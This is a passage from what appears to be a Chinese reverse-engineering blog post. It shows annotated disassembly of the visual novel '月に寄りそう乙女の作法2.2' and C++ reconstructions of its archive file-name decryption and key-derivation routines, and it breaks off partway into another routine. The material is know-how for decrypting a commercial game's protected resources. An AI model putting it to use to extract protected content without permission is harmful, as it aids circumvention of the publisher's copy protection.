alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">004E4C1E         | 53              | push ebx                                           |</span><br><span class="line">004E4C1F         | 56              | push esi                                           |</span><br><span class="line">004E4C20         | 57              | push edi                                           | edi:&quot;0yC&quot;</span><br><span class="line">004E4C21         | 33DB            | xor ebx,ebx                                        |</span><br><span class="line">004E4C23         | 895D FC         | mov dword ptr ss:[ebp-0x4],ebx                     |</span><br><span class="line">004E4C26         | 894D F0         | mov dword ptr ss:[ebp-0x10],ecx                    |</span><br><span class="line">004E4C29         | 8BDA            | mov ebx,edx                                        | edx:&quot;l;p&quot;</span><br><span class="line">004E4C2B         | 8945 F8         | mov dword ptr ss:[ebp-0x8],eax                     |</span><br><span class="line">004E4C2E         | 33C0            | xor eax,eax                                        |</span><br><span class="line">004E4C30         | 55              | push ebp                                           |</span><br><span class="line">004E4C31         | 68 334D4E00     | push 月に寄りそう乙女の作法22.4E4D33                          |</span><br><span class="line">004E4C36         | 64:FF30         | push dword ptr fs:[eax]                            | eax:&quot;^??~8&quot;</span><br><span class="line">004E4C39         | 64:8920         | mov dword ptr fs:[eax],esp                         |</span><br><span class="line">004E4C3C         | 8BC3            | mov eax,ebx                                        | eax等于hash</span><br><span class="line">004E4C3E         | C1E8 10         | shr eax,0x10                                       |</span><br><span class="line">004E4C41         | 25 FFFF0000     | and eax,0xFFFF                                     |</span><br><span class="line">004E4C46         | 33D8            | xor ebx,eax                                        | key = ((hash &gt;&gt; 0x10) &amp; 0xFFFF) ^ hash</span><br><span class="line">004E4C48         | 8B45 F0         | mov eax,dword ptr ss:[ebp-0x10]                    |</span><br><span class="line">004E4C4B         | 33D2            | xor edx,edx                                        | edx:&quot;l;p&quot;</span><br><span class="line">004E4C4D         | E8 D629F2FF     | call 月に寄りそう乙女の作法22.407628                          |</span><br><span class="line">004E4C52         | 8D55 E6         | lea edx,dword ptr ss:[ebp-0x1A]                    |</span><br><span class="line">004E4C55         | B9 02000000     | mov ecx,0x2                                        |</span><br><span class="line">004E4C5A         | 8B45 F8         | mov eax,dword ptr ss:[ebp-0x8]                     |</span><br><span class="line">004E4C5D         | 8B30            | mov esi,dword ptr ds:[eax]                         |</span><br><span class="line">004E4C5F         | FF56 0C         | call dword ptr ds:[esi+0xC]                        | 读取文件</span><br><span class="line">004E4C62         | 66:837D E6 00   | cmp word ptr ss:[ebp-0x1A],0x0                     | 读出的值是否大于等于0</span><br><span class="line">004E4C67         | 7D 16           | jge 月に寄りそう乙女の作法22.4E4C7F                           |</span><br><span class="line">004E4C69         | B9 504D4E00     | mov ecx,月に寄りそう乙女の作法22.4E4D50                       | 4E4D50:L&quot;_LoadStringCode:Out of length error.&quot;</span><br><span class="line">004E4C6E         | B2 01           | mov dl,0x1                                         | 小于0就报错</span><br><span class="line">004E4C70         | A1 D4004100     | mov eax,dword ptr ds:[0x4100D4]                    |</span><br><span class="line">004E4C75         | E8 D280F3FF     | call 月に寄りそう乙女の作法22.41CD4C                          |</span><br><span class="line">004E4C7A         | E9 98000000     | jmp 月に寄りそう乙女の作法22.4E4D17                           |</span><br><span class="line">004E4C7F         | 0FBF75 E6       | movsx esi,word ptr ss:[ebp-0x1A]                   |</span><br><span class="line">004E4C83         | 85F6            | test esi,esi                                       |</span><br><span class="line">004E4C85         | 0F8E 8C000000   | jle 月に寄りそう乙女の作法22.4E4D17                           |</span><br><span class="line">004E4C8B         | 56              | push esi                                           | Arg1</span><br><span class="line">004E4C8C         | 8D45 FC         | lea eax,dword ptr ss:[ebp-0x4]                     |</span><br><span class="line">004E4C8F         | B9 01000000     | mov ecx,0x1                                        |</span><br><span class="line">004E4C94         | 8B15 F44B4E00   | mov edx,dword ptr ds:[0x4E4BF4]                    | edx:&quot;l;p&quot;</span><br><span class="line">004E4C9A         | E8 6D44F2FF     | call 月に寄りそう乙女の作法22.40910C                          | Dynarraysetlength</span><br><span class="line">004E4C9F         | 83C4 04         | add esp,0x4                                        |</span><br><span class="line">004E4CA2         | 8B45 F0         | mov eax,dword ptr ss:[ebp-0x10]                    |</span><br><span class="line">004E4CA5         | 8BD6            | mov edx,esi                                        | edx:&quot;l;p&quot;</span><br><span class="line">004E4CA7         | E8 F82CF2FF     | call 月に寄りそう乙女の作法22.4079A4                          |</span><br><span class="line">004E4CAC         | 8BCE            | mov ecx,esi                                        |</span><br><span class="line">004E4CAE         | 03C9            | add ecx,ecx                                        |</span><br><span class="line">004E4CB0         | 8B55 FC         | mov edx,dword ptr ss:[ebp-0x4]                     |</span><br><span class="line">004E4CB3         | 8B45 F8         | mov eax,dword ptr ss:[ebp-0x8]                     |</span><br><span class="line">004E4CB6         | 8B38            | mov edi,dword ptr ds:[eax]                         | edi:&quot;0yC&quot;</span><br><span class="line">004E4CB8         | FF57 0C         | call dword ptr ds:[edi+0xC]                        | 读取文件</span><br><span class="line">004E4CBB         | 8BC6            | mov eax,esi                                        | 文件名解密开始</span><br><span class="line">004E4CBD         | 35 133E0000     | xor eax,0x3E13                                     | 这里len异或了3e13</span><br><span class="line">004E4CC2         | 33D8            | xor ebx,eax                                        | 这里异或了之前算出的Key</span><br><span class="line">004E4CC4         | 8BC6            | mov eax,esi                                        |</span><br><span class="line">004E4CC6         | F7EE            | imul esi                                           | eax=pow(esi,2)</span><br><span class="line">004E4CC8         | 33D8            | xor ebx,eax                                        | 继续异或</span><br><span class="line">004E4CCA         | 895D EC         | mov dword ptr ss:[ebp-0x14],ebx                    |</span><br><span class="line">004E4CCD         | 8165 EC FFFF000 | and dword ptr ss:[ebp-0x14],0xFFFF                 |</span><br><span class="line">004E4CD4         | 8B5D EC         | mov ebx,dword ptr ss:[ebp-0x14]                    |</span><br><span class="line">004E4CD7         | 8B7D FC         | mov edi,dword ptr ss:[ebp-0x4]                     |</span><br><span class="line">004E4CDA         | 8B45 F0         | mov eax,dword ptr ss:[ebp-0x10]                    |</span><br><span class="line">004E4CDD         | E8 AA33F2FF     | call 月に寄りそう乙女の作法22.40808C                          |</span><br><span class="line">004E4CE2         | 8945 E8         | mov dword ptr ss:[ebp-0x18],eax                    |</span><br><span class="line">004E4CE5         | 8BC6            | mov eax,esi                                        |</span><br><span class="line">004E4CE7         | 48              | dec eax                                            |</span><br><span class="line">004E4CE8         | 85C0            | test eax,eax                                       |</span><br><span class="line">004E4CEA         | 7C 2B           | jl 月に寄りそう乙女の作法22.4E4D17                            |</span><br><span class="line">004E4CEC         | 40              | inc eax                                            |</span><br><span class="line">004E4CED         | 33D2            | xor edx,edx                                        | edx:&quot;l;p&quot;</span><br><span class="line">004E4CEF         | C1E3 03         | shl ebx,0x3                                        | 解密循环 ebx初值为刚刚算出的key</span><br><span class="line">004E4CF2         | 8D0C1A          | lea ecx,dword ptr ds:[edx+ebx]                     | ecx = edx+ebx</span><br><span class="line">004E4CF5         | 034D EC         | add ecx,dword ptr ss:[ebp-0x14]                    | ecx = ecx+key</span><br><span class="line">004E4CF8         | 81E1 FFFF0000   | and ecx,0xFFFF                                     | ecx = ecx &amp; 0xFFFF</span><br><span class="line">004E4CFE         | 8BD9            | mov ebx,ecx                                        | ebx = ecx</span><br><span class="line">004E4D00         | 0FB70F          | movzx ecx,word ptr ds:[edi]                        | ecx = (WORD)文件名数据</span><br><span class="line">004E4D03         | 66:33CB         | xor cx,bx                                          | result = cx ^ bx</span><br><span class="line">004E4D06         | 8B75 E8         | mov esi,dword ptr ss:[ebp-0x18]                    |</span><br><span class="line">004E4D09         | 66:890E         | mov word ptr ds:[esi],cx                           |</span><br><span class="line">004E4D0C         | 83C7 02         | add edi,0x2                                        | edi:&quot;0yC&quot;</span><br><span class="line">004E4D0F         | 8345 E8 02      | add dword ptr ss:[ebp-0x18],0x2                    |</span><br><span class="line">004E4D13         | 42              | inc edx                                            | edx为循环次数</span><br><span class="line">004E4D14         | 48              | dec eax                                            |</span><br><span class="line">004E4D15         | 75 D8           | jne 月に寄りそう乙女の作法22.4E4CEF                           |</span><br><span class="line">004E4D17         | 33C0            | xor eax,eax                                        |</span><br><span class="line">004E4D19         | 5A              | pop edx                                            | edx:&quot;l;p&quot;</span><br><span class="line">004E4D1A         | 59              | pop ecx                                            |</span><br><span class="line">004E4D1B         | 59              | pop ecx                                            |</span><br><span class="line">004E4D1C         | 64:8910         | mov dword ptr fs:[eax],edx                         | eax:&quot;^??~8&quot;, edx:&quot;l;p&quot;</span><br><span class="line">004E4D1F         | 68 3A4D4E00     | push 月に寄りそう乙女の作法22.4E4D3A                          | Arg1 = &quot;_^[嬪]?&quot;</span><br><span class="line">004E4D24         | 8D45 FC         | lea eax,dword ptr ss:[ebp-0x4]                     |</span><br><span class="line">004E4D27         | 8B15 F44B4E00   | mov edx,dword ptr ds:[0x4E4BF4]                    | edx:&quot;l;p&quot;</span><br><span class="line">004E4D2D         | E8 FA44F2FF     | call 月に寄りそう乙女の作法22.40922C                          | sub_40922C</span><br><span class="line">004E4D32         | C3              | ret                                                |</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-31.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-32.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FileEntry</span></span><br><span class="line">&#123;</span><br><span class="line">        QWORD offset; <span class="comment">//老规矩写代码要写成两个int</span></span><br><span class="line">    DWORD size;</span><br><span class="line">    DWORD dencrypted_size;</span><br><span class="line">    DWORD isCompressed;</span><br><span class="line">    DWORD unkown1; </span><br><span class="line">    DWORD unkown2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-33.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-34.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-35.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-36.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">004</span>ECE7C         | <span class="number">55</span>              | push ebp                                           |</span><br><span class="line"><span class="number">004</span>ECE7D         | <span class="number">8B</span>EC            | mov ebp,esp                                        |</span><br><span class="line"><span class="number">004</span>ECE7F         | <span class="number">83</span>C4 F8         | add esp,<span class="number">0xFFFFFFF8</span>                                 |</span><br><span class="line"><span class="number">004</span>ECE82         | <span class="number">53</span>              | push ebx                                           |</span><br><span class="line"><span class="number">004</span>ECE83         | <span class="number">56</span>              | push esi                                           |</span><br><span class="line"><span class="number">004</span>ECE84         | <span class="number">57</span>              | push edi                                           | edi:<span class="string">&quot;0yC&quot;</span></span><br><span class="line"><span class="number">004</span>ECE85         | <span class="number">8955</span> F8         | mov dword ptr ss:[ebp<span class="number">-0x8</span>],edx                     |</span><br><span class="line"><span class="number">004</span>ECE88         | <span class="number">8945</span> FC         | mov dword ptr ss:[ebp<span class="number">-0x4</span>],eax                     |</span><br><span class="line"><span class="number">004</span>ECE8B         | BB <span class="number">32F</span>58500     | mov ebx,<span class="number">0x85F532</span>                                   | 这两个值之后会用到</span><br><span class="line"><span class="number">004</span>ECE90         | BE <span class="number">41F</span>63300     | mov esi,<span class="number">0x33F641</span>                                   |</span><br><span class="line"><span class="number">004</span>ECE95         | <span class="number">8B</span>45 <span class="number">08</span>         | mov eax,dword ptr ss:[ebp+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECE98         | <span class="number">8B</span>40 <span class="number">08</span>         | mov eax,dword ptr ds:[eax+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECE9B         | <span class="number">85</span>C0            | test eax,eax                                       |</span><br><span class="line"><span class="number">004</span>ECE9D         | <span class="number">74</span> <span class="number">1</span>C           | je 月に寄りそう乙女の作法<span class="number">22.4</span>ECEBB                            |</span><br><span class="line"><span class="number">004</span>ECE9F         | <span class="number">8B</span>D0            | mov edx,eax                                        | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECEA1         | <span class="number">83</span>EA <span class="number">0</span>A         | sub edx,<span class="number">0xA</span>                                        | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECEA4         | <span class="number">66</span>:<span class="number">833</span>A <span class="number">02</span>      | cmp word ptr ds:[edx],<span class="number">0x2</span>                          | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECEA8         | <span class="number">74</span> <span class="number">11</span>           | je 月に寄りそう乙女の作法<span class="number">22.4</span>ECEBB                            |</span><br><span class="line"><span class="number">004</span>ECEAA         | <span class="number">8B</span>45 <span class="number">08</span>         | mov eax,dword ptr ss:[ebp+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECEAD         | <span class="number">8B</span>50 <span class="number">08</span>         | mov edx,dword ptr ds:[eax+<span class="number">0x8</span>]                     | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECEB0         | <span class="number">8B</span>45 <span class="number">08</span>         | mov eax,dword ptr ss:[ebp+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECEB3         | <span class="number">83</span>C0 <span class="number">08</span>         | add eax,<span class="number">0x8</span>                                        |</span><br><span class="line"><span class="number">004</span>ECEB6         | E8 F59CF1FF     | call 月に寄りそう乙女の作法<span class="number">22.406B</span>B0                          |</span><br><span class="line"><span class="number">004</span>ECEBB         | <span class="number">85</span>C0            | test eax,eax                                       |</span><br><span class="line"><span class="number">004</span>ECEBD         | <span class="number">74</span> <span class="number">05</span>           | je 月に寄りそう乙女の作法<span class="number">22.4</span>ECEC4                            |</span><br><span class="line"><span class="number">004</span>ECEBF         | <span class="number">83E8</span> <span class="number">04</span>         | sub eax,<span class="number">0x4</span>                                        |</span><br><span class="line"><span class="number">004</span>ECEC2         | <span class="number">8B</span>00            | mov eax,dword ptr ds:[eax]                         | eax=文件名字符数</span><br><span class="line"><span class="number">004</span>ECEC4         | <span class="number">8B</span>D0            | mov edx,eax                                        | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECEC6         | <span class="number">4</span>A              | dec edx                                            | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECEC7         | <span class="number">85</span>D2            | test edx,edx                                       | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECEC9         | <span class="number">7</span>C <span class="number">20</span>           | jl 月に寄りそう乙女の作法<span class="number">22.4</span>ECEEB                            |</span><br><span class="line"><span class="number">004</span>ECECB         | <span class="number">42</span>              | inc edx                                            | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECECC         | <span class="number">33</span>C0            | <span class="keyword">xor</span> eax,eax                                        |</span><br><span class="line"><span class="number">004</span>ECECE         | <span class="number">8</span>D48 <span class="number">01</span>         | lea ecx,dword ptr ds:[eax+<span class="number">0x1</span>]                     | 循环开始</span><br><span class="line"><span class="number">004</span>ECED1         | <span class="number">8B</span>7D <span class="number">08</span>         | mov edi,dword ptr ss:[ebp+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECED4         | <span class="number">8B</span>7F <span class="number">08</span>         | mov edi,dword ptr ds:[edi+<span class="number">0x8</span>]                     | edi:<span class="string">&quot;0yC&quot;</span></span><br><span class="line"><span class="number">004</span>ECED7         | <span class="number">0F</span>B77C4F FE     | movzx edi,word ptr ds:[edi+ecx*<span class="number">2</span><span class="number">-0x2</span>]              | 取文件名的每个字符</span><br><span class="line"><span class="number">004</span>ECEDC         | <span class="number">8B</span>C8            | mov ecx,eax                                        | eax为循环次数</span><br><span class="line"><span class="number">004</span>ECEDE         | <span class="number">83E1</span> <span class="number">07</span>         | <span class="keyword">and</span> ecx,<span class="number">0x7</span>                                        | ecx=eax &amp; <span class="number">7</span></span><br><span class="line"><span class="number">004</span>ECEE1         | D3E7            | shl edi,cl                                         | edi为文件名word字符</span><br><span class="line"><span class="number">004</span>ECEE3         | <span class="number">03</span>DF            | add ebx,edi                                        | ebx=ebx+(edi &lt;&lt; cl)</span><br><span class="line"><span class="number">004</span>ECEE5         | <span class="number">33F</span>3            | <span class="keyword">xor</span> esi,ebx                                        | esi^=ebx</span><br><span class="line"><span class="number">004</span>ECEE7         | <span class="number">40</span>              | inc eax                                            | eax++</span><br><span class="line"><span class="number">004</span>ECEE8         | <span class="number">4</span>A              | dec edx                                            | edx--</span><br><span class="line"><span class="number">004</span>ECEE9         | <span class="number">75</span> E3           | jne 月に寄りそう乙女の作法<span class="number">22.4</span>ECECE                           | 使用文件名算出了一个（两个？esi ebx）hash</span><br><span class="line"><span class="number">004</span>ECEEB         | <span class="number">8B</span>45 <span class="number">08</span>         | mov eax,dword ptr ss:[ebp+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECEEE         | <span class="number">8B</span>40 FC         | mov eax,dword ptr ds:[eax<span class="number">-0x4</span>]                     | eax=数据大小</span><br><span class="line"><span class="number">004</span>ECEF1         | <span class="number">35</span> DC328F00     | <span class="keyword">xor</span> eax,<span class="number">0x8F32DC</span>                                   |</span><br><span class="line"><span class="number">004</span>ECEF6         | <span class="number">33</span>C3            | <span class="keyword">xor</span> eax,ebx                                        |</span><br><span class="line"><span class="number">004</span>ECEF8         | <span class="number">03</span>C3            | add eax,ebx                                        | eax=eax^ebx^<span class="number">0x8F32DC</span>+ebx</span><br><span class="line"><span class="number">004</span>ECEFA         | <span class="number">8B</span>55 <span class="number">08</span>         | mov edx,dword ptr ss:[ebp+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECEFD         | <span class="number">0342</span> FC         | add eax,dword ptr ds:[edx<span class="number">-0x4</span>]                     | eax=eax+数据大小</span><br><span class="line"><span class="number">004</span>ECF00         | <span class="number">8B</span>55 <span class="number">08</span>         | mov edx,dword ptr ss:[ebp+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECF03         | <span class="number">8B</span>52 FC         | mov edx,dword ptr ds:[edx<span class="number">-0x4</span>]                     | edx=数据大小</span><br><span class="line"><span class="number">004</span>ECF06         | <span class="number">81E2</span> FFFFFF00   | <span class="keyword">and</span> edx,<span class="number">0xFFFFFF</span>                                   | edx=edx &amp; <span class="number">0xFFFFFF</span></span><br><span class="line"><span class="number">004</span>ECF0C         | <span class="number">8B</span>CA            | mov ecx,edx                                        | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECF0E         | <span class="number">03</span>D2            | add edx,edx                                        | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECF10         | <span class="number">03</span>D2            | add edx,edx                                        | edx:<span class="string">&quot;l;p&quot;</span></span><br><span class="line"><span class="number">004</span>ECF12         | <span class="number">03</span>D2            | add edx,edx                                        | edx=edx*<span class="number">8</span></span><br><span class="line"><span class="number">004</span>ECF14         | <span class="number">2B</span>D1            | sub edx,ecx                                        | edx=edx-数据大小</span><br><span class="line"><span class="number">004</span>ECF16         | <span class="number">03</span>C2            | add eax,edx                                        | eax+=edx</span><br><span class="line"><span class="number">004</span>ECF18         | <span class="number">8B</span>55 <span class="number">08</span>         | mov edx,dword ptr ss:[ebp+<span class="number">0x8</span>]                     |</span><br><span class="line"><span class="number">004</span>ECF1B         | <span class="number">3342</span> <span class="number">0</span>C         | <span class="keyword">xor</span> eax,dword ptr ds:[edx+<span class="number">0xC</span>]                     | 异或了一个奇怪的值 <span class="comment">//这个奇怪的值就是之前最早算的hash</span></span><br><span class="line"><span class="number">004</span>ECF1E         | <span class="number">03F</span>0            | add esi,eax                                        |</span><br><span class="line"><span class="number">004</span>ECF20         | <span class="number">8B</span>C6            | mov eax,esi                                        |</span><br><span class="line"><span class="number">004</span>ECF22         | <span class="number">25</span> FFFFFF00     | <span class="keyword">and</span> eax,<span class="number">0xFFFFFF</span>                                   | eax=(eax+esi)&amp;<span class="number">0xFFFFFF</span></span><br><span class="line"><span class="number">004</span>ECF27         | <span class="number">8</span>D04C0          | lea eax,dword ptr ds:[eax+eax*<span class="number">8</span>]                   | eax=eax*<span class="number">9</span></span><br><span class="line"><span class="number">004</span>ECF2A         | <span class="number">8B</span>C8            | mov ecx,eax                                        |</span><br><span class="line"><span class="number">004</span>ECF2C         | <span class="number">8B</span>55 F8         | mov edx,dword ptr ss:[ebp<span class="number">-0x8</span>]                     | 循环次数</span><br><span class="line"><span class="number">004</span>ECF2F         | <span class="number">8B</span>45 FC         | mov eax,dword ptr ss:[ebp<span class="number">-0x4</span>]                     | 输出的缓冲区</span><br><span class="line"><span class="number">004</span>ECF32         | E8 <span class="number">09F</span>FFFFF     | call 月に寄りそう乙女の作法<span class="number">22.4</span>ECE40                          |</span><br><span class="line"><span class="number">004</span>ECF37         | <span class="number">5F</span>              | pop edi                                            | edi:<span class="string">&quot;0yC&quot;</span></span><br><span class="line"><span class="number">004</span>ECF38         | <span class="number">5</span>E              | pop esi                                            |</span><br><span class="line"><span class="number">004</span>ECF39         | <span class="number">5B</span>              | pop ebx                                            |</span><br><span class="line"><span class="number">004</span>ECF3A         | <span class="number">59</span>              | pop ecx                                            |</span><br><span class="line"><span class="number">004</span>ECF3B         | <span class="number">59</span>              | pop ecx                                            |</span><br><span class="line"><span class="number">004</span>ECF3C         | <span class="number">5</span>D              | pop ebp                                            |</span><br><span class="line"><span class="number">004</span>ECF3D         | C3              | ret                                                |</span><br></pre></td></tr></table></figure><p>写成c++代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD* <span class="title">dencrypt3_hash</span><span class="params">(<span class="type">int</span> hashlen,<span class="type">int</span> datalen,<span class="type">void</span>* filename,<span class="type">int</span> character_count,DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD key1 = <span class="number">0x85F532</span>; <span class="comment">//ebx</span></span><br><span class="line">    DWORD key2 = <span class="number">0x33F641</span>; <span class="comment">//esi</span></span><br><span class="line">    WORD* character = (WORD*)filename;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; character_count; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key1 = key1 + (*character &lt;&lt; (i &amp; <span class="number">7</span>));</span><br><span class="line">        key2 ^= key1;</span><br><span class="line">        character++;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD key3 = (datalen ^ key1 ^ <span class="number">0x8F32DC</span>) + key1 + datalen; <span class="comment">//eax</span></span><br><span class="line">    DWORD key4 = ((datalen &amp; <span class="number">0xFFFFFF</span>) &lt;&lt; <span class="number">3</span>) - datalen; <span class="comment">//edx</span></span><br><span class="line">    key3 += key4;</span><br><span class="line">    key3 ^= hash;</span><br><span class="line">    key3 = ((key3 + key2) &amp; <span class="number">0xFFFFFF</span>) * <span class="number">9</span>;</span><br><span class="line">    <span class="comment">//第二个计算函数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rax = key3;</span><br><span class="line">    DWORD* result = <span class="keyword">new</span> DWORD[hashlen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; hashlen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rax = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)(rax ^ <span class="number">0x8DF21431</span>u) * (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x8DF21431</span>u;</span><br><span class="line">        rax = ((rax &amp; <span class="number">0xFFFFFFFF00000000</span>) &gt;&gt; <span class="number">32</span>) + (rax &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">        rax = rax &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">        result[i] = rax;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是dencrypt3<br>关键的代码是这部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 